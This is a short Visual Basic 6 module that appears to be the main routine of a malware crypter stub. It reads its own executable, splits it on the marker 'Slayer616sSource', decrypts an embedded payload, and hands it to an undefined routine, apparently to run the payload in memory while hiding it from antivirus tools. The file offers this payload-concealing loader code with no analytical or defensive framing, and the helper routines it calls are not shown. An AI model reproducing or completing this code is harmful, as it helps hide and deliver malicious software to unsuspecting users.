Attribute VB_Name = "modMain"
Sub Main()
Dim StubData As String
Dim SplittedData() As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
StubData = Space(LOF(1))
Get #1, , StubData
Close #1
SplittedData() = Split(StubData, "Slayer616sSource")

Hmdka App.Path & "\" & App.EXEName & ".exe", StrConv(strDecrypt(Hex2Str(SplittedData(1)), Trim$(SplittedData(2))), vbFromUnicode), SplittedData(3), SplittedData(2)

End Sub
